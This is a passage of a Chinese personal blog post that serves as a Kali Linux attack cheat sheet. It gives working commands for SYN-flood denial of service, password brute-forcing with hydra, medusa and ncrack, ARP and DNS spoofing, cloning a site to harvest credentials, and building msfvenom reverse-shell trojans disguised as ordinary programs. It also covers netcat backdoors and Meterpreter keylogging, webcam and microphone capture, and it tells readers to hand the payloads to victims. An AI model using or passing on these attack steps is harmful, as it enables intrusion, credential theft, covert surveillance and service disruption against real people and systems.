+<h3 id="查看主机的主机名"><a href="#查看主机的主机名" class="headerlink" title="查看主机的主机名"></a>查看主机的主机名</h3><p>nbtscan 10.5.224.11</p>
+<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>端口扫描 伪造随机地址 dos攻击<br>hping3 -8 1-1024 -S ip<br>hping3 –rand-source IP  可以通过wireshark 抓包获取<br>hping3 -c 10000 -d 120 -S -w 64 -p 80 –flood –rand-source ip/url<br>-c  发送数据包数量<br>-d 发送目标机器每个数据包的大小<br>-S 只发送SYN数据包<br>-w tcp窗口大小<br>-p 目的地方端口<br>–flood 尽快发送数据包，不考考虑入站恢复</p>
+<h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>内网扫描存活主机<br>netdiscover -i eth0 -r 192.168.244.129/24</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>端口扫描<br>-sS 隐身扫描<br>-A 综合扫描<br>-O 识别系统os<br>nmap -sS -A -O -v 192.168.56.1  获取主机名，MAC地址，开放端口<br>nmap 10.5.224.1/24      扫描子网<br>nmap 192.168.25.2-10  扫描一个小范围<br>nmap -iL text.txt        扫描txt内的ip列表<br>namp 192.168.25.2 192.168.25.6   扫描多个主机<br>nmap 192.168.24.18      查看开放端口<br>nmap -p 1-1000 192.168.24.18      指定扫描端口<br>nmap -O 192.168.24.18     识别操作系统，端口及服务<br>nmap -sV 192.168.24.18  识别服务</p>
+<h3 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h3><p>wafw00f baidu.com  查看防火墙种类</p>
+<h3 id="zenmap-1"><a href="#zenmap-1" class="headerlink" title="zenmap"></a>zenmap</h3><p>图形化nmap<br>zenmap </p>
+<h1 id="目标识别"><a href="#目标识别" class="headerlink" title="目标识别"></a>目标识别</h1><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>使用ICMP协议，man ping 查看用法</p>
+<h2 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h2><p>穿透防火墙<br>-i 指定网卡<br>-c 发包数量<br>-s 源MAC<br>-S 源IP<br>arping 110.120.119.100</p>
+<h2 id="nping"><a href="#nping" class="headerlink" title="nping"></a>nping</h2><p>探测主机存活<br>nping –tcp -p 80 –flags syn –ttl 2 192.168.56.1</p>
+<h1 id="web扫描"><a href="#web扫描" class="headerlink" title="web扫描"></a>web扫描</h1><h2 id="httrack"><a href="#httrack" class="headerlink" title="httrack"></a>httrack</h2><p>httrack “<a href="https://ashercode.github.io/">https://ashercode.github.io/</a>“ -O /root/web/ “+<a href="https://ashercode.github.io/*">https://ashercode.github.io/*</a>“ -v  拷贝全栈</p>
+<h2 id="owasp-zap"><a href="#owasp-zap" class="headerlink" title="owasp-zap"></a>owasp-zap</h2><p>漏洞扫描器<br>打开firefox，about:preferences#advanced#Network,修改Connection setting,Manual proxy configuration,127.0.0.1 8080<br>命令owasp-zap，打开图形化界面，火狐访问<a href="http://www.suzumiya.me/，在owasp中生成文件夹，右键攻击Active" target="_blank" rel="noopener">http://www.suzumiya.me/，在owasp中生成文件夹，右键攻击Active</a> Scan或者爬行分析漏洞，出现在警报栏</p>
+<h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>skipfish -o /root/shuchu/ -Y -L <a href="http://80s.tw/" target="_blank" rel="noopener">http://80s.tw/</a> 扫描结果放到shuchu文件夹下，higher risk标识高危漏洞</p>
+<h2 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h2><p>whatweb <a href="http://80s.tw/" target="_blank" rel="noopener">http://80s.tw/</a> 获取网站ip，服务器类型等相关信息</p>
+<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>dpkg -i Nessus-5.2.0-debian6_i386.deb<br>/etc/init.d/nessusd start<br>访问<a href="https://kali:8834/" target="_blank" rel="noopener">https://kali:8834/</a> 新建账号<br><a href="http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code" target="_blank" rel="noopener">http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code</a>  获取激活码<br>下载插件后，刷新页面即可<br>New Scan/Advanced Scan 新建扫描名及目标地址，Folders为My Scans  即可开始扫描</p>
+<p>#密码破解</p>
+<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><p>搭建ftp服务器<br>yum install -y vsftpd<br>setenforce 0  关闭selinux<br>systemctl stop firewalld.service  关闭防火墙<br>mkdir /home/vsftpd<br>useradd -g root -M -d /home/vsftpd -s /sbin/nologin ftpuser  添加用户<br>passwd ftpuser<br>chown -R ftpuser.root /home/vsftpd<br>systemctl restart vsftpd.service</p>
+<p>kali在txt文档中添加字典<br>medusa -h 120.79.170.214 -u ftpuser -P a.txt -M ftp    知道用户名或密码就小写否则大写U P,ssh等服务器都可以<br>medusa -h 120.79.170.214 -U a.txt ftpuser -P a.txt -M ftp  </p>
+<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>破解telnet，ftp,http-proxy,POP3,IMAP,ssh<br>hydra -l AsherCode -p 123456 -t 1 -vV 120.79.170.214 telnet<br>hydra -L user.txt -P pass.txt -t 1 -vV 120.79.170.214 telnet<br>hydra -l root -P pwd2.dic -t 1 -vV -e ns -o save.log 192.168.44.139 ssh<br>hydra -L list_user -P list_password 192.168.56.101 ftp -V<br>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php<br>hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V<br>hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:<title>wrong username or password</title>“<br>hydra -l muts -P pass.txt my.pop3.mail pop3</p>
+<h1 id="NCrack"><a href="#NCrack" class="headerlink" title="NCrack"></a>NCrack</h1><p>ncrack -vv -U windows.user -P windows.pwd 10.5.224.188:3389 -f</p>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>vim test.txt<br>CCFF985ACBE948354486FE49BD91C2EB<br>cf7be73c856c99c0fe02a78a562375c5<br>vim superdict.txt<br>feitong!@#<br>abc123!@#<br>sh%4#2!<br>nl123456<br>sy8106237<br>%null%<br>admin<br>administrator<br>administrators<br>12345<br>开始破解：hashcat -a 0 -m 0 test.txt superdict.txt </p>
+<h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><p>apt-get install rarcrack  可以破解7z,rar,zip<br>新建test.rar.xml,0标识未知字符,该文件可以自动生成<br>&lt;?xml version=”1.0” encoding=”UTF-8”&gt;</p>
+<p><rarcrack><br>  <abc>0123456789qwertyuiopasdfghjklzxcvbnm</abc><br>  <current>aaa0</current><br>  <good_password></good_password><br></rarcrack><br>rarcrack –type rar –threads 10 test.rar </p>
+<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>破解zip密码<br>fcrackzip -b -ca1!A -l 1-4 -u a.zip -v<br>a=a-z<br>A=A-Z<br>!=特殊字符<br>1=0-9</p>
+<h1 id="密码生成"><a href="#密码生成" class="headerlink" title="密码生成"></a>密码生成</h1><h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><p>cewl -w a.dic <a href="http://120.79.170.214/" target="_blank" rel="noopener">http://120.79.170.214/</a>  根据页面关键字生成字典用于社工</p>
+<h2 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h2><p>crunch 4 4 qwertyuiopasdfghjklzxcvbnm -o pass.txt  生成4为密码字典<br>crunch 1 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o a.dic 调用密码库pass.lst生成最小1最大8的密码库<br>cat /usr/share/crunch/charset.lst</p>
+<h1 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h1><h2 id="apktool"><a href="#apktool" class="headerlink" title="apktool"></a>apktool</h2><p>apktool d /root/a.apk   在/usr/share/apktool/可以查看安卓源码</p>
+<h2 id="dex2jar"><a href="#dex2jar" class="headerlink" title="dex2jar"></a>dex2jar</h2><p>dex2jar classes.dex  将apk后缀改为rar解压得到classes.dex,即可获得classes_dex2jar.jar的源码包</p>
+<h1 id="内网安全"><a href="#内网安全" class="headerlink" title="内网安全"></a>内网安全</h1><h2 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali</span><br><span class="line">	apt-get install openbsd-inetd</span><br><span class="line">	apt-get install telnetd</span><br><span class="line">	/etc/init.d/openbsd-inetd  restart</span><br><span class="line">	telnet 192.168.244.129    测试通过</span><br><span class="line">	ettercap -i eth0 -Tq -M arp:remote /192.168.244.1/192.168.244.101/		攻击win7 /网关/ip</span><br><span class="line">windows7 </span><br><span class="line">	telnet 192.168.244.129  登录成功信息将被kali捕获，必须在192.168.244.*网段</span><br></pre></td></tr></table></figure>
+<p>ettercap -G  图形界面操作</p>
+<blockquote>
+<ul>
+<li>Sniff-Unified sniffing选择网卡</li>
+<li>Hosts-Scan for Hosts-Hosts List<br>  192.168.244.1  Add to Target1<br>  192.168.244.254 Add to Target2</li>
+<li>Mitm    -ARP poisoning-Sniff remote connections</li>
+<li>start-start sniffing<h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2>vim /var/www/html/index.html<br>/etc/init.d/apache2 start<br>vim /etc/ettercap/etter.dns<ul>
+<li>A    192.168.244.129</li>
+<li>PTR  192.168.244.129<br>ettercap -i eth0 -Tq -P dns_spoof /192.168.244.1/192.168.244.101/    则在101的地址访问任何网址都指向192.168.244.129</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>ettercap -G    图形化操作</p>
+<blockquote>
+<ul>
+<li>Sniff-Unified sniffing选择网卡</li>
+<li>Hosts-Scan for Hosts-Hosts List<br>  192.168.244.1  Add to Target1<br>  192.168.244.254 Add to Target2</li>
+<li>Mitm    -ARP poisoning-Sniff remote connections</li>
+<li>plugins-manage the plugins-双击dns_spoof</li>
+<li>start-start sniffing</li>
+</ul>
+</blockquote>
+<p>##setoolkit</p>
+<h3 id="钓鱼网站盗取账号"><a href="#钓鱼网站盗取账号" class="headerlink" title="钓鱼网站盗取账号"></a>钓鱼网站盗取账号</h3><blockquote>
+<ul>
+<li>kali<br>  setoolkit<br>  Social-Engineering Attacks  &gt;  Website Attack Vectors  &gt; Credentials Harvester Attack Method &gt; Site Cloner<br>  set:webattack&gt; IP address or hostname for the reverse connection:10.5.224.26<br>  set:webattack&gt; Enter the url to clone:<a href="http://i.fkw.com/" target="_blank" rel="noopener">http://i.fkw.com/</a><br>  通过短网址修改自己的ip，将网址发给被攻击者</li>
+<li>windows7/phone<br>  输入网址，输入密码和账号，在kali的/var/www/html/harvester_ 即可获取输入数据<h3 id="可执行木马制作"><a href="#可执行木马制作" class="headerlink" title="可执行木马制作"></a>可执行木马制作</h3></li>
+<li>kali<br>  Social-Engineering Attacks &gt; Create a Payload and Listener &gt; Windows Reverse_TCP Meterpreter<br>  10.5.224.28  443   yes<br>  ~/.set/payload.exe 复制给windows</li>
+<li>window<br>  运行payload</li>
+<li>命令<br>  sessions  查看在线肉鸡<br>  help              获取帮助<br>  sessions -i 1  登录指定电脑</li>
+</ul>
+</blockquote>
+<pre><code>getsystem      获取系统权限
+webcam_snap    尝试开启摄像头
+screenshot     获取目标屏幕截屏
+record_mic -d 10     录制10秒钟声音
+keyscan_start         开启键盘记录
+keyscan_dump     查看键盘记录到的内容
+netstat -ano  查看3389端口
+rdesktop -u administrator -p &quot;&quot;  10.5.224.25:3389  
+</code></pre><h3 id="获取图片流量"><a href="#获取图片流量" class="headerlink" title="获取图片流量"></a>获取图片流量</h3><pre><code>ettercap -i eth0 -Tq -M arp:remote /10.5.224.1/10.5.224.25/        先arp欺骗
+driftnet -i eth0 -a -d ~/桌面        打开网卡，指定ip访问图片流量将被抓取保存    
+</code></pre><h3 id="病毒邮件"><a href="#病毒邮件" class="headerlink" title="病毒邮件"></a>病毒邮件</h3><pre><code>Social-Engineering Attacks &gt; Social-Engineering Attacks &gt; Social-Engineering Attacks
+Adobe collab.collectEmailInfo Buffer Overflow(缓冲区溢出漏洞) &gt; Windows Meterpreter Reverse_TCP  
+设置ip：10.5.224.28  端口：1111 &gt; 生成病毒文件后，可以Social-Engineering Attacks
+Social-Engineering Attacks &gt; Pre-Defined Template &gt; 选择WOAAAAA!!!!! This is crazy &gt; wangjian@codyy.com
+Use your own server or open relay&gt; 相关邮箱信息 smtp.qq.com &gt; high priority  尽量使用gamil邮箱
+</code></pre><h3 id="powser-攻击向量"><a href="#powser-攻击向量" class="headerlink" title="powser 攻击向量"></a>powser 攻击向量</h3><pre><code>Social-Engineering Attacks &gt; Powershell Attack Vectors &gt; Powershell Alphanumeric Shellcode Injector 输入ip+端口
+cp /root/.set/reports/powershell/x86_powershell_injection.txt 里的文件给windows的cmd执行，即可获取sessions
+</code></pre><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><pre><code>windows 执行nc.exe -d -L -p 2222 -e cmd.exe 
+kali 执行 nc 10.5.224.25 2222 即可访问
+</code></pre><h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><pre><code>kali 执行 nc -l -p 1111
+windows 执行 nc.exe -d 10.5.224.28 1111  -e cmd.exe
+</code></pre><h3 id="持续访问"><a href="#持续访问" class="headerlink" title="持续访问"></a>持续访问</h3><pre><code>kali24: ptunnel        1.再24访问10.5.224.25:80
+kali23:  ptunnel -p 10.5.224.24 -lp 1234 -da 10.5.224.25 -dp 80  2.在访问127.0.0.1:1234 即得到被攻击者
+windos25:
+</code></pre><h2 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h2><h3 id="网页木马1"><a href="#网页木马1" class="headerlink" title="网页木马1"></a>网页木马1</h3><pre><code>use exploit/windows/browser/ms14_064_ole_code_execution
+set payload windows/meterpreter/reverse_tcp
+set AllowPowershellPrompt true
+set LHOST 10.5.224.28
+rexploit
+将返回的链接让被攻击者打开即可攻击
+</code></pre><h3 id="网页木马2"><a href="#网页木马2" class="headerlink" title="网页木马2"></a>网页木马2</h3><pre><code>windows 的httpd.conf 的Directory下修改为    allow from all
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.5.224.28 -f raw &gt; 1.php
+vim 1.php 删除 /* 复制到服务器根目录
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 10.5.224.28
+exploit
+本地访问10.5.224.25/1.php 则可获取sessions
+sysinfo  查看系统信息
+shell进入目录    
+</code></pre><h3 id="应用程序木马"><a href="#应用程序木马" class="headerlink" title="应用程序木马"></a>应用程序木马</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.5.224.28 lport=4444 -f exe -o /root/qq.exe
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.5.224.28
+run
+将生成的exe给被攻击者打开拿shell
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>欢迎和博主一起玩耍呀-------------</div>
+    
+</div>
+  
+</div>
+<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/post/网络安全之kali.html">网络安全之kali</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 AsherCode 的个人博客">AsherCode</a></p>
+  <p><span>发布时间:</span>2018年03月07日 - 08:03</p>
+  <p><span>最后更新:</span>2018年03月07日 - 08:03</p>
+  <p><span>原始链接:</span><a href="/post/网络安全之kali.html" title="网络安全之kali">http://ashercode.github.io/post/网络安全之kali.html</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://ashercode.github.io/post/网络安全之kali.html"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+</div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>请博主吃包辣条</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="AsherCode 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="AsherCode 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/kali/" rel="tag"><i class="fa fa-tag"></i> kali</a>
+          
+            <a href="/tags/msfconsole/" rel="tag"><i class="fa fa-tag"></i> msfconsole</a>
+          
+            <a href="/tags/setoolkit/" rel="tag"><i class="fa fa-tag"></i> setoolkit</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/springboot搭建博客.html" rel="next" title="springboot搭建博客">
+                <i class="fa fa-chevron-left"></i> springboot搭建博客
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=2152116" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzg0MC8xMDM5Mw=="></div>
+    </div>
+
+  
+   
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="AsherCode" />
+            
+              <p class="site-author-name" itemprop="name">AsherCode</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ashercode" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://weibo.com/u/5317695564/home" target="_blank" title="微博">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>微博</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ashercode.github.io" title="本站孪生地址" target="_blank">本站孪生地址</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GoogleHacking"><span class="nav-number">1.1.</span> <span class="nav-text">GoogleHacking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#站长工具"><span class="nav-number">1.2.</span> <span class="nav-text">站长工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用漏洞平台"><span class="nav-number">1.3.</span> <span class="nav-text">常用漏洞平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具获取信息"><span class="nav-number">1.4.</span> <span class="nav-text">工具获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOS"><span class="nav-number">1.4.1.</span> <span class="nav-text">DOS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AWVS-10-5"><span class="nav-number">1.4.2.</span> <span class="nav-text">AWVS 10.5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zenmap"><span class="nav-number">1.4.3.</span> <span class="nav-text">zenmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装kali虚拟机"><span class="nav-number">1.4.4.</span> <span class="nav-text">安装kali虚拟机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS收集分析"><span class="nav-number">1.5.</span> <span class="nav-text">DNS收集分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nslookup"><span class="nav-number">1.5.1.</span> <span class="nav-text">nslookup</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装dnsdict6"><span class="nav-number">1.5.2.</span> <span class="nav-text">安装dnsdict6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnsmap"><span class="nav-number">1.5.3.</span> <span class="nav-text">dnsmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnsrecon"><span class="nav-number">1.5.4.</span> <span class="nav-text">dnsrecon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fierce"><span class="nav-number">1.5.5.</span> <span class="nav-text">fierce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lbd"><span class="nav-number">1.5.6.</span> <span class="nav-text">lbd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reverseraider"><span class="nav-number">1.5.7.</span> <span class="nav-text">reverseraider</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#host"><span class="nav-number">1.5.8.</span> <span class="nav-text">host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dig"><span class="nav-number">1.5.9.</span> <span class="nav-text">dig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnsenum"><span class="nav-number">1.5.10.</span> <span class="nav-text">dnsenum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DMitry"><span class="nav-number">1.5.11.</span> <span class="nav-text">DMitry</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络扫描"><span class="nav-number">1.6.</span> <span class="nav-text">网络扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MAC地址"><span class="nav-number">1.6.1.</span> <span class="nav-text">MAC地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcptraceroute"><span class="nav-number">1.6.2.</span> <span class="nav-text">tcptraceroute</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tctrace"><span class="nav-number">1.6.3.</span> <span class="nav-text">tctrace</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索引擎搜集信息"><span class="nav-number">1.7.</span> <span class="nav-text">搜索引擎搜集信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#metagoofil"><span class="nav-number">1.7.1.</span> <span class="nav-text">metagoofil</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#goofile"><span class="nav-number">1.7.2.</span> <span class="nav-text">goofile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#goohost"><span class="nav-number">1.7.3.</span> <span class="nav-text">goohost</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fimap"><span class="nav-number">1.7.4.</span> <span class="nav-text">fimap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#theharvester"><span class="nav-number">1.7.5.</span> <span class="nav-text">theharvester</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#amap"><span class="nav-number">1.7.6.</span> <span class="nav-text">amap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fping"><span class="nav-number">1.7.7.</span> <span class="nav-text">fping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看主机的主机名"><span class="nav-number">1.7.8.</span> <span class="nav-text">查看主机的主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hping3"><span class="nav-number">1.7.9.</span> <span class="nav-text">hping3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netdiscover"><span class="nav-number">1.7.10.</span> <span class="nav-text">netdiscover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.7.11.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wafw00f"><span class="nav-number">1.7.12.</span> <span class="nav-text">wafw00f</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zenmap-1"><span class="nav-number">1.7.13.</span> <span class="nav-text">zenmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目标识别"><span class="nav-number">2.</span> <span class="nav-text">目标识别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ping"><span class="nav-number">2.1.</span> <span class="nav-text">ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arping"><span class="nav-number">2.2.</span> <span class="nav-text">arping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nping"><span class="nav-number">2.3.</span> <span class="nav-text">nping</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web扫描"><span class="nav-number">3.</span> 